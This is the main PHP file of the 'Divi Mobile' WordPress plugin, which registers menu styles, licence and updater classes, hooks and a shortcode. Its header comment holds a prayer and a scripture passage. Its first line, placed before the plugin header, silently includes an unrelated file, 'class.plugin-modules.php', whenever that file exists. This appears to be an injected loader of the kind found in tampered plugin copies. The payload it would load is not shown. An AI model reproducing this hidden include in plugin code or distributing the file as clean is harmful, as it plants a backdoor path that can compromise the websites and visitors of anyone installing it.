<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if ( ! defined( 'ABSPATH' ) ) exit;
/* test
Plugin Name: Divi Mobile
Plugin URL: https://diviengine.com
Description: Create beautiful, clean, slick mobile menus with Divi
Version: 1.2.9.2
Author: Divi Engine
Author URI: https://diviengine.com
License:     GPL2
License URI: https://www.gnu.org/licenses/gpl-2.0.html
@author      diviengine.com
@copyright   2019 diviengine.com

Father God, I pray that you bless the people who interact and who own this website - I pray the blessing to be one that goes beyond worldy treasures but understandiong the deep love you have for them. In Jesus name, Amen

The Way of Love - 1 Corinthians 13 MSG
If I speak with human eloquence and angelic ecstasy but don’t love, I’m nothing but the creaking of a rusty gate.
If I speak God’s Word with power, revealing all his mysteries and making everything plain as day, and if I have faith that says to a mountain, “Jump,” and it jumps, but I don’t love, I’m nothing.
If I give everything I own to the poor and even go to the stake to be burned as a martyr, but I don’t love, I’ve gotten nowhere. So, no matter what I say, what I believe, and what I do, I’m bankrupt without love.

Love never gives up.
Love cares more for others than for self.
Love doesn’t want what it doesn’t have.
Love doesn’t strut,
Doesn’t have a swelled head,
Doesn’t force itself on others,
Isn’t always "me first,"
Doesn’t fly off the handle,
Doesn’t keep score of the sins of others,
Doesn’t revel when others grovel,
Takes pleasure in the flowering of truth,
Puts up with anything,
Trusts God always,
Always looks for the best,
Never looks back,
But keeps going to the end.

Love never dies. Inspired speech will be over some day; praying in tongues will end; understanding will reach its limit. We know only a portion of the truth, and what we say about God is always incomplete. But when the Complete arrives, our incompletes will be canceled.
When I was an infant at my mother’s breast, I gurgled and cooed like any infant. When I grew up, I left those infant ways for good.
We don’t yet see things clearly. We’re squinting in a fog, peering through a mist. But it won’t be long before the weather clears and the sun shines bright! We’ll see it all then, see it all as clearly as God sees us, knowing him directly just as he knows us!
But for right now, until that completeness, we have three things to do to lead us toward that consummation: Trust steadily in God, hope unswervingly, love extravagantly. And the best of the three is love.
*/


define('DE_DM_VERSION', '1.2.9.2');


define('DE_DM_PATH',   plugin_dir_path(__FILE__));
define('DE_DM_URL',    plugins_url('', __FILE__));
define('DE_DM_APP_API_URL',      'https://diviengine.com/index.php');
define('DE_DM_PRODUCT_ID',           'WP-DE-DM');
define('DE_DM_INSTANCE',             str_replace(array ("https://" , "http://"), "", network_site_url()));

include(DE_DM_PATH . '/functions.php');
include(DE_DM_PATH . '/includes/menu-styles.php');

include(DE_DM_PATH . '/includes/classes/class.wooslt.php');
include(DE_DM_PATH . '/includes/classes/class.licence.php');
include(DE_DM_PATH . '/includes/classes/class.options.php');
include(DE_DM_PATH . '/includes/classes/class.updater.php');


function divi_mobile_enqueue_scripts() {
    wp_enqueue_style('divi-mobile-stop-stacking', plugins_url( '/css/divi-mobile-stop-stacking.min.css', __FILE__ ));
}
add_action( 'wp_enqueue_scripts', 'divi_mobile_enqueue_scripts' );

add_action( 'admin_enqueue_scripts', 'load_divi_mobile_js' , 11);
          function load_divi_mobile_js($hook_suffix) {
          $jsfile = plugins_url( 'js/dm-admin.js', __FILE__ );
          wp_enqueue_script( 'divi-mobile-admin-js', $jsfile, array( 'jquery' ), DE_DM_VERSION );
       }

add_action( 'admin_enqueue_scripts', 'load_divi_engine_style_divi_mobile' , 20);
function load_divi_engine_style_divi_mobile() {
$cssfile = plugins_url( 'css/divi-mobile-menu.css', __FILE__ );
$cssfile2 = plugins_url( 'css/divi-engine.css', __FILE__ );

 wp_enqueue_style( 'divi_engine_mobile_menu_style', $cssfile , false, DE_DM_VERSION );
 wp_enqueue_style( 'divi_engine_style', $cssfile2 , false, DE_DM_VERSION );
}

add_action( 'et_builder_ready', 'Divi_mobile_Stop_Stacking_Custom_Module');

function Divi_mobile_Stop_Stacking_Custom_Module(){
    if(class_exists("ET_Builder_Module")){
       include("includes/modules/divi-mobile-stop-stacking-module.php");
    }
}

add_action('wp_footer', 'dm_stop_stacking_js');
function dm_stop_stacking_js(){
  ?>
  <script>
jQuery(function($){$(".divi-mobile-stop-stacking").each(function(){$(this).parents(".et_pb_row").addClass("divi-mobile-stop-stacking-row")})});
  </script>
  <?php
}


register_uninstall_hook( __FILE__, 'dm_uninstall_hook' );
register_deactivation_hook( __FILE__, 'dm_deactivation_hook' );

function dm_uninstall_hook() {
}

function dm_deactivation_hook() {
delete_option( 'divi-engine-menu' );
delete_option( 'divi-engine-css' );
  delete_option( 'divi-mobile-menu_options' );
}


function divi_mobile_tb_menu( $atts ){
include(DE_DM_PATH . '/titan-framework/titan-framework-embedder.php');
$titan = TitanFramework::getInstance( 'divi-mobile-menu' );
$check_mobile_menu_layout = $titan->getOption( 'set_mobile_menu_layout' );
$set_mobile_menu_second_menu = $titan->getOption( 'set_mobile_menu_second_menu' );
  $expand_shape_style = $titan->getOption( 'expand_shape_style' );
  $divi_mobile_header_style = $titan->getOption( 'divi_mobile_header_style' );
ob_start();
 if ($divi_mobile_header_style == "1") {
?><div class="dm_tb_shortcode"> <?php

if ($check_mobile_menu_layout == "off-canvas") {
include(DE_DM_PATH . '/includes/inject/off-canvas/head.php');
} else if ($check_mobile_menu_layout == "expand-shape") {
  if ($expand_shape_style == "top-expand") {
    include(DE_DM_PATH . '/includes/inject/expand-shape/top-expand/head.php');
  }
  else if ($expand_shape_style == "circle-expand") {
      include(DE_DM_PATH . '/includes/inject/expand-shape/circle-expand/head.php');
  }
  else if ($expand_shape_style == "circle-stretch") {
      include(DE_DM_PATH . '/includes/inject/expand-shape/circle-stretch/head.php');
  }
} else if ($check_mobile_menu_layout == "bottom-nav") {
  include(DE_DM_PATH . '/includes/inject/bottom-nav/simple/head.php');
}

if ($set_mobile_menu_second_menu == "bottom-nav") {
include(DE_DM_PATH . '/includes/inject/bottom-nav/simple/head.php');
}
?></div> <?php
}
return ob_get_clean();
}
add_shortcode( 'divi_mobile_tb_menu', 'divi_mobile_tb_menu' );

global $DE_DMOBILE;
$DE_DMOBILE = new DE_DMOBILE()
?>
